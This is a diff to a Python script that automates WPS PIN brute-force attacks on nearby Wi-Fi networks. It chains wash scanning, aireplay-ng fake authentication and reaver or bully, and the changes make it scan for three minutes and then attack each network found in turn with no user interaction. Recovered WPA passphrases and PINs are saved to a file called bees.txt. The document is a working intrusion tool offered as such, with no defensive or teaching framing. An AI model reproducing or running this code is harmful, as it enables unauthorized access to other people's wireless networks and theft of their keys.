@@ -65,15 +65,22 @@ def clear():
 def scan():
     global network_max
     try:
-        subprocess.Popen(['wash', '-i', interface, '--ignore-fcs', '-P' , '-o', 'temp.csv'], stdout=DN, stderr=DN)
+	timeout = time.time() + 60*3
+	subprocess.Popen(['wash', '-i', interface, '--ignore-fcs', '-P' , '-o', 'temp.csv'], stdout=DN, stderr=DN)
         time.sleep(5)
         while True:
+	    if time.time() > timeout:
+		break
             clear()
             cr = csv.reader(open("temp.csv"))
             row_count = sum(1 for row in cr)
 	    network_max = row_count
+	    print ("Scanning for 3 Minutes...")
             print ("Found",str(row_count),"Networks")
             time.sleep(3)
+	subprocess.Popen(['killall', 'wash'], stdout=DN, stderr=DN)
+        subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
+        subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
     except KeyboardInterrupt:
         subprocess.Popen(['killall', 'wash'], stdout=DN, stderr=DN)
         subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
@@ -98,7 +105,7 @@ def choose():
         clear()
         return 0
 		
-def auto():
+def auto(attackmode):
    global bssid, ssid, channel, network_max
    counter = 0
    try:
@@ -108,12 +115,12 @@ def auto():
 		bssid=row['BSSID']
 		channel=row['Channel']
 		ssid=row['SSID']
-		if row['Locked'] is "Yes":
-			print('Skipping %s due to locked WPS' % (bssid))
-			time.sleep(5)
-			continue
 		if open('bees.txt', 'r').read().find(bssid) != -1:
 			print('Key already recovered for %s' % (bssid))
+			time.sleep(5)
+			continue
+		elif row['Locked'] is "Yes":
+			print('Skipping %s due to locked WPS' % (bssid))
 			time.sleep(5)
 			continue
 		if attackmode == 2:
@@ -154,12 +161,12 @@ def reaver():
         #subprocess.Popen(cmd, stdout=DN, stderr=DN)
         #time.sleep(5)
         cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
-        subprocess.Popen(cmd2, stdout=DN, stderr=DN)
         time.sleep(5)
         cmd3 = ['reaver', '-i', interface, '-b', bssid, '-c', str(channel), '-vvv',  "-L", "-a", "-A", "-P", '-K', str(1)]
         timeout = time.time() + 60*3
 	proc = subprocess.Popen(cmd3, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         stdout = []
+	subprocess.Popen(cmd2, stdout=DN, stderr=DN)
         while True:
 	    line = proc.stdout.readline()
             stdout.append(line)
@@ -189,11 +196,9 @@ def reaver():
             if "WPS pin" in line and PIN == "":
                 PIN=line.split(':',4)[1].strip()
                 print("WPS Pin: found")
-		print(PIN)
             if "WPA PSK" in line:
                 PWD=line.split(':',1)[1].strip()
                 print("Key recovered!")
-		print(PWD)
                 keycount = keycount + 1
                 text_file = open("bees.txt", "a")
                 text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n\n" % (ssid, bssid, PWD, PIN))
@@ -276,42 +281,48 @@ def bully():
         subprocess.call(['killall', 'aireplay-ng'])
     reset()
 		
-x=0
+#x=0
 clear()
-attackmode=input('(1)Reaver / (2)Bully')
-clear()
+
 if os.path.isfile("bees.txt"):
 	pass
 else:
 	subprocess.call(['touch', 'bees.txt'])
-while x != 99:
-        if interface == 0:
-            print("Interface: none")
-        else:
-            print("Interface:",interface)
-	if attackmode == 1:
-	    print("Attackmode: Reaver")
-	else:
-	    print("Attackmode: Bully")
-	print('Networks: %s' % (network_max))
-        print("1. Start Monitormode")
-        print('2. Scan Networks')
-        print('3. Choose Network')
-        print('4. Start Attack')
-	print('5. Automode')
-        print('99. Exit')
-        x=input('Choice: ')
-        if x == 1:
-            monitor()
-        if x == 2:
-            scan()
-        if x == 3:
-            choose()
-        if x == 4:
-            reaver()
-	if x == 5:
-	    auto()
+#while x != 99:
+#        if interface == 0:
+#            print("Interface: none")
+#        else:
+#            print("Interface:",interface)
+#	if attackmode == 1:
+#	    print("Attackmode: Reaver")
+#	else:
+#	    print("Attackmode: Bully")
+#	print('Networks: %s' % (network_max))
+#       print("1. Start Monitormode")
+#        print('2. Scan Networks')
+#        print('3. Choose Network')
+#        print('4. Start Attack')
+#	print('5. Automode')
+#        print('99. Exit')
+#        x=input('Choice: ')
+#        if x == 1:
+#            monitor()
+#        if x == 2:
+#            scan()
+#        if x == 3:
+#            choose()
+#        if x == 4:
+#            reaver()
+#	if x == 5:
+#	    auto(1)//
 
+monitor()
+scan()
+auto(1)
+
+subprocess.call(['killall', 'airodump-ng'])
+subprocess.call(['killall', 'reaver'])
+subprocess.call(['killall', 'aireplay-ng'])
 subprocess.call(['airmon-ng', 'stop', interface], stdout=DN)
 subprocess.call(['service', 'network-manager', 'restart'])
 subprocess.call(['rm', 'temp.csv'])
